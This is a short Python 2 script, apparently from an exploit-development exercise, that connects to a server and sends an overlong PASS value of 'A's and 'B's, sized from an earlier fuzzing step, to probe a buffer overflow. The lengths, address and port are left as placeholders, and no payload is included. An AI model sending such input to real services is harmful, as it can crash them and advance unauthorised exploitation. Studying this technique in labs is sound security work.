#!/usr/bin/python
import socket
# Create a buffer of A + B based on result of 1-fuzzer.
buffer=["A"*xxx + "B"*xxx]
for string in buffer:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "Fuzzing PASS with %s bytes" % len(string)
    connect=s.connect(('ip',port))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
